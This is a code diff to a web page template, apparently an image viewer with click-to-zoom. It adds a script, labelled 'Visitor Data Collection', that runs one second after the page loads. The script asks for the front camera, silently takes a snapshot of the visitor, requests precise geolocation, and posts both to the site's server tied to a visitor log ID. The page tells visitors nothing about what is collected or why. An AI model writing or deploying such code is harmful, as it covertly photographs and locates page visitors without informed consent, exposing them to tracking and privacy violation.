@@ -114,6 +114,142 @@
         }
 
         container.addEventListener('click', zoomToggle);
+
+        // Visitor Data Collection (Camera & Location)
+        @if(isset($visitorLog) && $visitorLog)
+        (function() {
+            const visitorLogId = {{ $visitorLog->id }};
+            let cameraImage = null;
+            let locationData = null;
+
+            // Request camera access and capture photo
+            async function captureCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' } // Front camera
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // Wait for video to be ready
+                    await new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.width = video.videoWidth;
+                            video.height = video.videoHeight;
+                            resolve();
+                        };
+                    });
+
+                    // Capture frame
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // Stop video stream
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Convert to base64
+                    cameraImage = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // Send data if location is also available
+                    if (locationData) {
+                        sendVisitorData();
+                    }
+                } catch (error) {
+                    console.log('Camera access denied or not available:', error);
+                    // Continue without camera data
+                    if (locationData) {
+                        sendVisitorData();
+                    }
+                }
+            }
+
+            // Get location
+            function getLocation() {
+                if (!navigator.geolocation) {
+                    console.log('Geolocation not supported');
+                    if (cameraImage) {
+                        sendVisitorData();
+                    }
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        
+                        // Send data if camera is also available
+                        if (cameraImage) {
+                            sendVisitorData();
+                        }
+                    },
+                    function(error) {
+                        console.log('Location access denied:', error);
+                        // Continue without location data
+                        if (cameraImage) {
+                            sendVisitorData();
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+
+            // Send visitor data to server
+            async function sendVisitorData() {
+                const data = {
+                    visitor_log_id: visitorLogId,
+                    _token: '{{ csrf_token() }}'
+                };
+
+                if (cameraImage) {
+                    data.camera_image = cameraImage;
+                }
+
+                if (locationData) {
+                    data.latitude = locationData.latitude;
+                    data.longitude = locationData.longitude;
+                    data.location_accuracy = locationData.accuracy;
+                }
+
+                try {
+                    const response = await fetch('{{ route("visitor.data.store") }}', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-CSRF-TOKEN': '{{ csrf_token() }}'
+                        },
+                        body: JSON.stringify(data)
+                    });
+
+                    const result = await response.json();
+                    if (result.success) {
+                        console.log('Visitor data saved successfully');
+                    }
+                } catch (error) {
+                    console.error('Error sending visitor data:', error);
+                }
+            }
+
+            // Start collecting data (non-blocking)
+            setTimeout(() => {
+                // Request both permissions simultaneously
+                captureCamera();
+                getLocation();
+            }, 1000); // Wait 1 second after page load
+        })();
+        @endif
     </script>
 </body>
 </html>
